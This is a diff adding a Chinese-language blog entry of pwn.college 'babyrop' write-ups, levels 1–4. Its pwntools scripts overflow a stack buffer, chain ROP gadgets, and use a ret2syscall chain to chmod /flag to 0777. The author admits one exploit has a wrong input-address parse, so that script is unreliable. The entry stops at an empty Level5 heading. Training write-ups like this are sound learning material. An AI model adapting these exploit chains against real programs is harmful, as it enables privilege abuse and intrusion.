@@ -3748,4 +3748,113 @@ p.interactive()
         <tag>pwncollege</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ROP</title>
+    <url>/2022/03/10/ROP/</url>
+    <content><![CDATA[<html><head></head><body><p>写在前面：如果是普通的环境，运行程序可能需要<code>capstone</code>，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里</p>
+<p><code> cp libcapstone.so.5 /lib/x86_64-linux-gnu/</code></p>
+<h4 id="Level1">Level1<a class="post-anchor" href="#Level1"></a></h4><p>​        最最最基础的rop了，和前前一个module的前面的有个level一模一样。</p>
+<pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+
+p = process("/challenge/babyrop_level1.0")
+win = 0x401b56
+
+payload = b"a"*104 + p64(win)
+
+p.send(payload)
+
+
+p.interactive()
+</code></pre>
+<h4 id="Level2">Level2<a class="post-anchor" href="#Level2"></a></h4><pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+
+p = process("/challenge/babyrop_level2.0")
+win1 = 0x4022EE
+win2 = 0x40239B
+
+payload = b"a"*88 + p64(win1) + p64(win2)
+
+p.send(payload)
+
+
+p.interactive()
+</code></pre>
+<h4 id="Level3">Level3<a class="post-anchor" href="#Level3"></a></h4><p>​        从这个level差不多沾了一些rop的边了，需要利用<code>ROPgadget</code>来寻找对应的gadget</p>
+<p>​        </p>
+<pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+
+p = process("/challenge/babyrop_level3.0")
+win1 = 0x40275A
+win2 = 0x402836
+win3 = 0x402678
+win4 = 0x402592
+win5 = 0x402916
+#0x0000000000402d03 : pop rdi ; ret
+rdi = 0x402d03
+
+payload = b"a"*72  
+payload += p64(rdi) +p64(1) + p64(win1)
+payload += p64(rdi)+p64(2) + p64(win2)
+payload    += p64(rdi) +p64(3) + p64(win3)
+payload += p64(rdi)+p64(4)  + p64(win4)
+payload += p64(rdi)+ p64(5) + p64(win5)
+
+p.send(payload)
+
+
+p.interactive()
+</code></pre>
+<p>​    </p>
+<h4 id="Level4">Level4<a class="post-anchor" href="#Level4"></a></h4><p>​        </p>
+<p>​        rop，ret2syscall。</p>
+<p>​        这道题其实方法有很多，但是由于栈的空间相对比较小，所以官方给出的做法反而是最聪明也是最实际的。</p>
+<p>（因为如果要orw或者getshell的话似乎还要栈迁移）</p>
+<pre><code class="python">process.write(b'/flag\0'.ljust(88,b'a') + pwn.p64(pop_rax.address)+pwn.p64(90) + pwn.p64(pop_rdi.address)+pwn.p64(input) 
+    ...: + pwn.p64(pop_rsi.address) + pwn.p64(0o777) + pwn.p64(syscall.address))
+</code></pre>
+<p>我魔怔了</p>
+<p>顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了）</p>
+<pre><code class="python">from pwn import*
+
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+
+p = process("./babyrop_level4.0")
+syscall = 0x401a69
+pop_rdi_ret = 0x401492
+pop_rax_ret = 0x401a91
+pop_rsi_ret = 0x401a71
+
+p.recvuntil("[LEAK] Your input buffer is located at: ")
+
+input  = u64(p.recv()[:12])
+
+gdb.attach(p)
+print(input)
+payload = b"/flag\0".ljust(88,b'a')  
+payload += p64(pop_rax_ret) + p64(90)
+payload += p64(pop_rdi_ret) + p64(input)
+payload += p64(pop_rsi_ret) + p64(0o777)
+payload += p64(syscall)
+
+p.send(payload)
+
+
+p.interactive()
+</code></pre>
+<p>‘</p>
+<h4 id="level5">level5<a class="post-anchor" href="#level5"></a></h4></body></html>]]></content>
+      <tags>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
 </search>
